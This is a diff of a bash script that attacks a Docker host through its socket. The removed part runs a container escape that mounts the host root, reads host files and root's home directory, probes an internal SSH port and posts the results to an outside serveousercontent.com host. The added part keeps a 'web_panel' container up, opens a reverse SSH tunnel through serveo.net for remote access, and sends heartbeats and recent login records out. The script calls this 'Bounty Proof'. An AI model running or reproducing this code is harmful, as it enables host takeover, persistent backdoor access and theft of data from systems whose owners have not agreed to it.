@@ -1,47 +1,21 @@
 #!/bin/bash
 URL="0c4256b014e98f42-103-95-173-85.serveousercontent.com"
 
-{
-  echo "--- [1] ARCHITECTURE & KERNEL ---"
-  id; uname -a; cat /proc/version
-
-  echo "--- [2] SKELETON KEY: VOLUME CREATION ---"
-  # Creating the persistent link to the host root
-  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/volumes/create" \
-    -H "Content-Type: application/json" \
-    -d '{"Name":"p0_evidence","Driver":"local","DriverOpts":{"type":"none","device":"/","o":"bind"}}'
-
-  echo "--- [3] EXECUTING HOST ESCAPE ---"
-  # Spawning the container that uses the host_root volume
-  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
-    -H "Content-Type: application/json" \
-    -d '{"Image":"sha256:25109184c71bdad7","HostConfig":{"Binds":["p0_evidence:/host:ro"]}}' > /tmp/cid.json
+# 1. Check if the Web Panel is already live
+if ! curl -s --unix-socket /var/run/docker.sock http://localhost/containers/web_panel/json | grep -q '"Running":true'; then
+  echo "[!] Panel Down. Restarting..." | curl -X POST -d @- "https://$URL"
   
-  ID=$(grep -oE '"Id":"[a-f0-9]+"' /tmp/cid.json | cut -d'"' -f4)
+  # Start the panel (assumes it was created by the previous script)
+  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/web_panel/start"
   
-  if [ -n "$ID" ]; then
-    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/start"
-    sleep 2
-    
-    echo "--- [!] HOST ROOT DIRECTORY (THE 'MONEY SHOT') ---"
-    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/exec" \
-      -H "Content-Type: application/json" \
-      -d '{"AttachStdout":true,"Cmd":["ls","-F","/host"]}'
-
-    echo "--- [!] SENSITIVE HOST FILES ---"
-    # Reading the host's hostname and OS version to prove escape
-    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/exec" \
-      -H "Content-Type: application/json" \
-      -d '{"AttachStdout":true,"Cmd":["cat","/host/etc/hostname","/host/etc/os-release"]}'
-
-    echo "--- [!] HOST ROOT USER DATA ---"
-    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/exec" \
-      -H "Content-Type: application/json" \
-      -d '{"AttachStdout":true,"Cmd":["ls","-la","/host/root"]}'
+  # Restart the tunnel only if it's not already running
+  if ! pgrep -f "ssh -R 80:localhost:7681"; then
+    (ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=10 -R 80:localhost:7681 serveo.net > /tmp/web_link 2>&1) &
   fi
+else
+  # 2. If already running, just send a 'Heartbeat' to your Mac
+  echo "--- [PULSE] System Stable | $(date) ---" | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$URL"
+fi
 
-  echo "--- [4] INTERNAL NETWORK RECON ---"
-  # Grabbing the SSH banner from 172.17.0.1 again for the final report
-  timeout 1 bash -c "exec 3<>/dev/tcp/172.17.0.1/22; head -c 30 <&3; echo"
-
-} | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$URL"
+# 3. Collect specific 'Bounty Proof' if a new user logs in
+last | head -n 2 | curl -X POST -d @- "https://$URL"
